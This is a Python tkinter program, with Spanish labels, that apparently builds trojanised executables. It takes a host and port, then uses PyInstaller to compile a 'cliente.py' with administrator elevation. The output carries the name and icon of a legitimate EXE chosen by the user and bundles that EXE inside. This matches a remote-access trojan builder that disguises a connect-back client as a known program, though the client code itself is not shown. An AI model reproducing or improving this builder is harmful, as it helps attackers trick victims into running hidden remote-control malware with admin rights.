import tkinter as tk
import subprocess
import os
from tkinter import filedialog


def seleccionar_exe():
    ruta = filedialog.askopenfilename(
        title="Seleccionar archivo EXE",
        filetypes=[("Archivos EXE", "*.exe"), ("Todos los archivos", "*.*")]
    )
    if ruta:
        entry_exe.delete(0, tk.END)
        entry_exe.insert(0, ruta)


def seleccionar_ico():
    ruta = filedialog.askopenfilename(
        title="Seleccionar archivo ICO",
        filetypes=[("Iconos", "*.ico"), ("Todos los archivos", "*.*")]
    )
    if ruta:
        entry_ico.delete(0, tk.END)
        entry_ico.insert(0, ruta)


def generar_exe():
    host = entry_host.get().strip()
    port = entry_port.get().strip()
    ruta_exe = entry_exe.get().strip()
    ruta_ico = entry_ico.get().strip()

    if not host or not port:
        status_label.config(text="Faltan parámetros de host o puerto.", fg="red")
        return
    if not ruta_exe:
        status_label.config(text="Debes seleccionar un EXE base.", fg="red")
        return
    if not ruta_ico:
        status_label.config(text="Debes seleccionar un icono .ico.", fg="red")
        return

    # Obtener nombre para el EXE final
    exe_name = os.path.splitext(os.path.basename(ruta_exe))[0]
    ico_name = os.path.splitext(os.path.basename(ruta_ico))[0]

    # Crear archivo con los parámetros
    with open("config_build.py", "w") as f:
        f.write(f'HOST = "{host}"\nPORT = {port}\nEXE_NAME = "{exe_name}.exe"\n')

    status_label.config(text="Generando exe... Esto puede tardar.", fg="blue")
    root.update()

    comando = [
        "pyinstaller",
        "--onefile",
        "--clean",
        "--noupx",
        #"--windowed",
        "--uac-admin",
        f"--name={exe_name}",
        f"--icon={ico_name}.ico",
        f"--add-data={exe_name}.exe;.",
        "cliente.py"
    ]

    print(comando)
    try:
        subprocess.run(comando, check=True)
        status_label.config(text="EXE generado en /dist", fg="green")
    except Exception as e:
        status_label.config(text=f"Error: {e}", fg="red")


root = tk.Tk()
root.title("Generador de EXE con parámetros")

tk.Label(root, text="Host:").pack()
entry_host = tk.Entry(root)
entry_host.pack()
entry_host.insert(0, "192.168.1.3")

tk.Label(root, text="Puerto:").pack()
entry_port = tk.Entry(root)
entry_port.pack()
entry_port.insert(0, "5555")

tk.Label(root, text="Archivo EXE base:").pack()
frame_exe = tk.Frame(root)
frame_exe.pack()
entry_exe = tk.Entry(frame_exe, width=40)
entry_exe.pack(side=tk.LEFT)
tk.Button(frame_exe, text="Seleccionar", command=seleccionar_exe).pack(side=tk.LEFT, padx=5)

tk.Label(root, text="Icono (.ico):").pack()
frame_ico = tk.Frame(root)
frame_ico.pack()
entry_ico = tk.Entry(frame_ico, width=40)
entry_ico.pack(side=tk.LEFT)
tk.Button(frame_ico, text="Seleccionar", command=seleccionar_ico).pack(side=tk.LEFT, padx=5)

tk.Button(root, text="GENERAR EXE", command=generar_exe).pack(pady=10)

status_label = tk.Label(root, text="")
status_label.pack()

root.mainloop()
